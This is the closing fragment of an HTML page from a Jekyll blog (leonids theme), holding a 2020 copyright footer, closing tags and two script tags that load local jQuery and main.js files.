  &copy; 2020 Thomas. Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://github.com/renyuanz/leonids/">leonids theme</a> made with <i class="fa fa-heart heart-icon"></i>
</footer>

      </div>
    </div>
  </div>
  <script type="text/javascript" src="/js/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script>


</body>
</html>
